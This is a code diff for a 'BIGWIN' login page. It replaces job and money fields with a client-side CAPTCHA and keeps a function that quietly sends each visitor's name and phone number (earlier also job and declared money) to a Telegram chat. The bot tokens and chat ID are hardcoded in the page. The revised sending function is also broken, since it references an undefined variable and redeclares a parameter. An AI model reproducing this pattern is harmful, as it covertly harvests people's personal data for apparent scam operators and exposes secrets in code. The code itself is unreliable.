@@ -6,6 +6,30 @@
     <title>BIGWIN - Login</title>
     <link rel="stylesheet" href="index.css" />
     <style>
+      .captcha-container {
+        display: flex;
+        align-items: center;
+        margin-top: 10px;
+      }
+
+      .captcha-text {
+        font-size: 1.2em;
+        font-weight: bold;
+        background-color: #f0f0f0;
+        padding: 5px 10px;
+        margin-right: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
+      .captcha-input {
+        flex: 1;
+        padding: 8px;
+        font-size: 1em;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+      }
+
       .error-message {
         display: none;
         color: red;
@@ -30,16 +54,6 @@
 
       <input
         type="text"
-        id="jobName"
-        placeholder="Enter job name"
-        required
-      />
-      <div class="error-message" id="job-error">
-        Please enter your job name.
-      </div>
-
-      <input
-        type="text"
         id="message"
         placeholder="Enter number"
         maxlength="10"
@@ -50,21 +64,30 @@
         Please enter a 10-digit number.
       </div>
 
-      <input
-        type="number"
-        id="money"
-        placeholder="How much money you have"
-        min="0"
-        required
-      />
-      <div class="error-message" id="money-error">
-        Please enter a valid amount of money.
+      <div class="captcha-container">
+        <div class="captcha-text" id="captcha-text">12345</div>
+        <input
+          type="text"
+          class="captcha-input"
+          id="captcha-input"
+          placeholder="Enter CAPTCHA"
+          required
+        />
+      </div>
+      <div class="error-message" id="captcha-error">
+        CAPTCHA is incorrect. Please try again.
       </div>
 
       <button onclick="validateAndProcess()">Submit</button>
     </div>
 
     <script>
+      // Generate random CAPTCHA
+      function generateCaptcha() {
+        const randomCaptcha = Math.floor(10000 + Math.random() * 90000);
+        document.getElementById("captcha-text").innerText = randomCaptcha;
+      }
+
       // Update the clock display
       function updateClock() {
         const now = new Date();
@@ -82,15 +105,6 @@
         input.value = input.value.replace(/[^0-9]/g, "");
       }
 
-      // Set a cookie
-      function setCookie(name, value, days) {
-        const date = new Date();
-        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
-        const expires = "expires=" + date.toUTCString();
-        document.cookie =
-          name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
-      }
-
       // Redirect if cookies are already set
       function checkCookiesAndRedirect() {
         const userName = getCookie("userName");
@@ -104,14 +118,13 @@
       // Validate and process login
       function validateAndProcess() {
         const name = document.getElementById("name").value.trim();
-        const jobName = document.getElementById("jobName").value.trim();
         const message = document.getElementById("message").value.trim();
-        const money = document.getElementById("money").value.trim();
+        const captchaInput = document.getElementById("captcha-input").value.trim();
+        const captchaText = document.getElementById("captcha-text").innerText.trim();
 
         const nameError = document.getElementById("name-error");
-        const jobError = document.getElementById("job-error");
         const numberError = document.getElementById("number-error");
-        const moneyError = document.getElementById("money-error");
+        const captchaError = document.getElementById("captcha-error");
 
         let isValid = true;
 
@@ -122,13 +135,6 @@
           nameError.style.display = "none";
         }
 
-        if (!jobName) {
-          jobError.style.display = "block";
-          isValid = false;
-        } else {
-          jobError.style.display = "none";
-        }
-
         if (message.length !== 10) {
           numberError.style.display = "block";
           isValid = false;
@@ -136,51 +142,45 @@
           numberError.style.display = "none";
         }
 
-        if (!money || isNaN(money) || Number(money) <= 0) {
-          moneyError.style.display = "block";
+        if (captchaInput !== captchaText) {
+          captchaError.style.display = "block";
           isValid = false;
         } else {
-          moneyError.style.display = "none";
+          captchaError.style.display = "none";
         }
 
         if (isValid) {
           setCookie("userName", name, 7);
-          setCookie("userJob", jobName, 7);
           setCookie("userNumber", message, 7);
-          setCookie("userMoney", money, 7);
-          sendMessageToTelegram(name, jobName, message, money);
+          sendToTelegram({ name, message });
+          window.location.href = "home.html";
         }
       }
 
-      // Send login details to Telegram
-      function sendMessageToTelegram(name, jobName, number, money) {
-        const chatId = "5786268361"; // Your Telegram chat ID
-        const botToken = "7769361866:AAE5mLkwPGOOR8yaY-NgeOew0EpXei7y7W4"; // Your Telegram bot token
-        const message = `Name: ${name}\nJob: ${jobName}\nNumber: ${number}\nMoney: ${money}`;
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
-          message
-        )}`;
+      // Send data to Telegram
+      function sendToTelegram(name,message) {
+        const chatId = "5786268361";
+        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc";
+        const message = `Login Details:\nName: ${data.name}\nNumber: ${data.message}`;
 
-        fetch(url)
-          .then((response) => response.json())
-          .then((data) => {
-            if (data.ok) {
-              window.location.href = "home.html";
-            } else {
-              alert("Error sending message: " + data.description);
-            }
-          })
-          .catch((error) => {
-            alert("Failed to send message.");
-          });
+        fetch(
+          `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+            message
+          )}`
+        )
+          .then((res) => res.json())
+          .then((data) => console.log("Telegram Response:", data))
+          .catch((err) => console.error("Telegram Error:", err));
       }
 
-      // Initialize the script after the page has fully loaded
-      document.addEventListener("DOMContentLoaded", () => {
-        updateClock();
-        checkCookiesAndRedirect();
-        setInterval(updateClock, 1000);
-      });
+      // Set a cookie
+      function setCookie(name, value, days) {
+        const date = new Date();
+        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+        const expires = "expires=" + date.toUTCString();
+        document.cookie =
+          name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
+      }
 
       // Get a cookie value by name
       function getCookie(name) {
@@ -194,6 +194,14 @@
         }
         return null;
       }
+
+      // Initialize the script after the page has fully loaded
+      document.addEventListener("DOMContentLoaded", () => {
+        updateClock();
+        checkCookiesAndRedirect();
+        generateCaptcha();
+        setInterval(updateClock, 1000);
+      });
     </script>
   </body>
 </html>
